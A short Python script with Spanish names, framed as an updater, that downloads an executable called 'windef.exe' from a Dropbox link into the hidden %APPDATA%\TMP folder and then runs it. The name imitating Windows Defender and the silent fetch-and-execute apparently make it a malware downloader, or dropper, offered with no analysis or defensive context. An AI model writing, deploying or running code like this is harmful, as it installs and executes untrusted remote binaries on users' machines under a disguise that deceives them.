import os
import subprocess
import requests
from pathlib import Path
from urllib.parse import urljoin

def descargar_ejecutable(url, destino):
    response = requests.get(url, stream=True)
    response.raise_for_status()
    
    with open(destino, 'wb') as archivo:
        for chunk in response.iter_content(chunk_size=8192):
            archivo.write(chunk)

def actualizar_ejecutable():
    url_base = 'https://dl.dropbox.com/scl/fi/jeyh5skw4yfejo89jrms9/windef.exe?rlkey=8eskz8wpj79mqjn0b8bf2uhoz&dl=0'
    nombre_ejecutable = 'windef.exe'
    carpeta_destino = Path(os.getenv('APPDATA')) / 'TMP'
    ruta_ejecutable = carpeta_destino / nombre_ejecutable

    carpeta_destino.mkdir(parents=True, exist_ok=True)

    url_completa = urljoin(url_base, nombre_ejecutable)
    descargar_ejecutable(url_completa, ruta_ejecutable)

    subprocess.run([str(ruta_ejecutable)])
